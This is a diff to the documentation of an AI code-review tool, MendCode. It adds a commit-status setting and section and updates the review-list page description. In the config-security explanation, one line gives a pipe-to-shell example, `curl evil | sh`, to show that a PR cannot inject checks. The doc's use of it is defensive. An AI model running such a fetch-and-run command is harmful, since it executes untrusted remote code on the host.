@@ -90,10 +90,11 @@ template: { sections: [], tone: neutral, language: English }        # tone: neut
 backlog: { max_prs: 10, window_days: 30 }   # open PRs reviewed when a watch starts (below); 0..50 and 1..365; max_prs: 0 = none
 readers: { enabled: true }  # data files go to cheap readers; parallel: 1..8 (unset: by tier); model: a cheap model (below)
 commands: { describe_title: false, approve: false }   # may `@mendcode describe` replace the title; may `@mendcode approve` approve (below)
+status: true            # a publishing review sets the `MendCode review` commit status on the PR head (below)
 ```
 
 The base branch's file decides everything a pull request could abuse: `enabled`, `checks`, `budget`, `ignore`, `profile`, `cap`,
-`fixes`, the triggers, the cooldown, `reviewers`, `publishers`, `backlog`, `commands` and `template.language`. The logins in `reviewers` and
+`fixes`, the triggers, the cooldown, `reviewers`, `publishers`, `backlog`, `commands`, `status` and `template.language`. The logins in `reviewers` and
 `publishers` follow the checkout's forge: GitLab and Gitea usernames may hold `_` and `.` (not a trailing `.`), and a GitHub login
 only letters, digits and `-`. A PR's own file may only add path instructions, so a PR that adds `checks: [curl evil | sh]` runs
 nothing. A watching reviewer reads these from the base branch's current tip on `origin` (fetched into `FETCH_HEAD` only), not
@@ -433,6 +434,17 @@ pass checked N candidates again and confirmed none" when every candidate was dro
 separate pass (N candidates judged)" when some were kept; and for a stopped review, that it is incomplete and that nothing
 unverified is published. Candidates outside the diff that were left out are counted on the same line.
 
+### Commit status
+
+A review that publishes to GitHub also sets the commit status `MendCode review` on the PR head (`MendCode review (<id>)` for a
+reviewer other than the repository's own): `pending` ("Reviewing…") when it starts, then `success` ("No findings", "No new
+findings" when a re-review posted nothing, or "N findings, none blocking"), `failure` when a critical or major finding is open on
+that head, or `error` when the review stopped before it was complete (the token budget, a quota, a failure), never `success`. It
+links to the review, or to the pull request when nothing was posted. To require it, add `MendCode review` as a required status
+check in the base branch's protection rule (Settings → Branches, or a ruleset). The hosted workflow sets it only when its token has
+`statuses: write` (add it under `permissions:`); a token that cannot is skipped quietly and the review goes on. `status: false` in
+the base branch's `.mendcode/review.yaml` sets none.
+
 ### What a review looks like
 
 The summary (`publish.ts` `reviewBody`) starts with `## MendCode review`, the verdict (`**3 findings** · 🔴 1 critical · 🟠 2 major`,
@@ -534,8 +546,11 @@ the spinner and the time move with the activity status's own clock, which stops 
 
 `/reviews` lists one row per pull request: the job at work when there is one, else the newest, with `· N runs` when the PR had
 earlier ones. So a failure that a later review of the same PR superseded is not listed under Failed: Failed holds the PRs whose
-last run failed. A running row shows its live phase and time (`analysis · 1m 20s`), a finished one what it found
-(`done · no findings`, `done · 2 findings`). The detail of a running job lists its steps; a done job says how it ended instead of
+last run failed. A running row shows the activity status's spinner with its phase, running step and time
+(`⠋ analysis · 112 files · 1m 20s`), a finished one what it found (`done · no findings`, `done · 2 findings`). Until you pick a
+row (↑↓ or enter, which marks the detail `pinned`), the selection follows the running review that started last, else the job
+updated last, and moves when another review starts; esc returns a pinned selection to following. The detail of a running job
+shows the same live line under its state and lists its steps; a done job says how it ended instead of
 a phase; a failed one names the phase it failed in and its attempts. Under it, `Earlier runs` lists the PR's other runs, newest
 first, each with its head, how it ended and, for a failure, its error. A job or watch this daemon owns says `this device`. When a
 checkout does not answer `status` within 3 seconds (a busy git or a hung child process), the page still gets the jobs and the
